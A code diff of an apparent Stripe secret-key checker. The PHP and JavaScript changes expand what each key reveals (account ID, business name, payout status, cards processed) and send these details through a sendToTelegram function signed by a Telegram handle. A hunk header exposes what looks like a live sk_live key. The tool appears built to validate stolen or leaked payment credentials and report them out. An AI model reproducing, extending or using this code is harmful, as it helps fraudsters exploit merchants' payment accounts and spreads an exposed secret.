@@ -52,6 +52,10 @@ function sendToTelegram($sk, $result) {
     $message .= "💱 *Currency:* " . ($result['details']['currency'] ?? 'N/A') . "\n";
     $message .= "🌍 *Country:* " . ($result['details']['country'] ?? 'N/A') . "\n";
     $message .= "📧 *Email:* " . ($result['details']['email'] ?? 'N/A') . "\n";
+    $message .= "🏢 *Business:* " . ($result['details']['business_name'] ?? 'N/A') . "\n";
+    $message .= "🆔 *Account ID:* " . ($result['details']['account_id'] ?? 'N/A') . "\n";
+    $message .= "💳 *Payouts Enabled:* " . ($result['details']['payouts_enabled'] ? 'Yes' : 'No') . "\n";
+    $message .= "📋 *Details Submitted:* " . ($result['details']['details_submitted'] ? 'Yes' : 'No') . "\n";
     $message .= "🕒 *Time:* " . date('Y-m-d H:i:s') . "\n\n";
     $message .= "Made By @stilll_alivenow";
     
@@ -1107,28 +1111,57 @@ sk_live_51DDSUGK9MUllm7DlfsKmNnHxdSmP3LeRcIEtqHP3jM5StXfGSk1a6lF4Q8l55hmouR5LJPl
                 
                 let html = '';
                 
-                // Balance info
-                if (details.currency || details.balance || details.pending_balance) {
+                // Account Information
+                if (details.account_id || details.business_name || details.email) {
                     html += `
                         <div class="info-row">
-                            <span class="info-label">Balance Info</span>
+                            <span class="info-label">Account Info</span>
                             <span class="info-value">
-                                Currency: ${details.currency || 'N/A'}<br>
-                                Balance: ${details.balance !== 'N/A' ? '$' + details.balance : 'N/A'}<br>
-                                Pending: $${details.pending_balance || '0'}
+                                ${details.account_id && details.account_id !== 'N/A' ? 'ID: ' + details.account_id + '<br>' : ''}
+                                ${details.business_name && details.business_name !== 'N/A' ? 'Business: ' + details.business_name + '<br>' : ''}
+                                ${details.email && details.email !== 'N/A' ? 'Email: ' + details.email : ''}
                             </span>
                         </div>
                     `;
                 }
                 
-                // Account info
-                if (details.country || details.email) {
+                // Location & Status
+                if (details.country || details.charges_enabled !== undefined) {
                     html += `
                         <div class="info-row">
-                            <span class="info-label">Account Info</span>
+                            <span class="info-label">Status</span>
                             <span class="info-value">
                                 ${details.country && details.country !== 'N/A' ? 'Country: ' + details.country + '<br>' : ''}
-                                ${details.email && details.email !== 'N/A' ? 'Email: ' + details.email : ''}
+                                Charges: ${details.charges_enabled ? '<span class="text-success">Enabled</span>' : '<span class="text-danger">Disabled</span>'}<br>
+                                Payouts: ${details.payouts_enabled ? '<span class="text-success">Enabled</span>' : '<span class="text-danger">Disabled</span>'}<br>
+                                Details: ${details.details_submitted ? '<span class="text-success">Submitted</span>' : '<span class="text-warning">Pending</span>'}
+                            </span>
+                        </div>
+                    `;
+                }
+                
+                // Balance info
+                if (details.currency || details.balance !== undefined || details.pending_balance !== undefined) {
+                    html += `
+                        <div class="info-row">
+                            <span class="info-label">Balance Info</span>
+                            <span class="info-value">
+                                Currency: ${details.currency || 'N/A'}<br>
+                                Available: ${details.balance !== undefined && details.balance !== 'N/A' ? '$' + details.balance : 'N/A'}<br>
+                                Pending: $${details.pending_balance || '0'}<br>
+                                Cards Processed: ${details.cards_processed || '0'}
+                            </span>
+                        </div>
+                    `;
+                }
+                
+                // Capabilities
+                if (details.card_payments && details.card_payments !== 'N/A') {
+                    html += `
+                        <div class="info-row">
+                            <span class="info-label">Capabilities</span>
+                            <span class="info-value">
+                                Card Payments: ${details.card_payments}
                             </span>
                         </div>
                     `;
